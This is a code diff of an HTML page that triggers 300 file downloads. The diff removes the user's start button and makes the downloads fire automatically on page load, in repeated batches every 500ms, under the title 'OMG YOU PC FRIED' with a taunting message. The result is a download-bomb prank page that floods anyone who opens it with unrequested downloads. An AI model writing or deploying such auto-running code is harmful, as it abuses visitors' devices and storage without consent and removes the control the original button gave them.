@@ -2,10 +2,9 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Download 300 Copies</title>
+  <title>OMG YOU PC FRIED</title>
 </head>
 <body>
-  <button id="start">Start Batch Download</button>
   <script>
     const totalCopies = 300;
     const batchSize = 100;
@@ -22,17 +21,17 @@
         link.remove();
       }
       if (current <= totalCopies) {
-        document.getElementById('start').style.display = 'inline';
+        setTimeout(downloadBatch, 500); // Wait 500ms before next batch
       } else {
-        alert('All downloads triggered!');
+        console.log('All downloads triggered!');
       }
     }
 
-    document.getElementById('start').addEventListener('click', function() {
-      this.style.display = 'none';
-      setTimeout(downloadBatch, 200);
+    document.addEventListener("DOMContentLoaded", function() {
+      downloadBatch();
     });
   </script>
-  <p>Press “Start Batch Download” after each round if your browser blocks downloads.</p>
+
+  <p>Attempting to download 300 copies automatically. :D sorry :( :) </p>
 </body>
 </html>
